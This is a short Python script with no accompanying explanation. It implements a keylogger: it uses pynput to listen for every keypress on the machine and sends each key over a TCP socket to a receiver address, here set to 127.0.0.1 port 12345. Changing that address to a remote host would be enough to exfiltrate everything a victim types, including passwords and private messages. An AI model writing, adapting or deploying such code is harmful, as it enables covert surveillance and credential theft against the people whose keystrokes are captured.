import socket
from pynput import keyboard

# Server (receiver) address and port
server_address = ('127.0.0.1', 12345)

def send_key(key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(server_address)
        s.sendall(key.encode('utf-8'))

def on_press(key):
    try:
        send_key(str(key))
    except Exception as e:
        print(f"Error sending key: {e}")

# Start listening for keypress events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
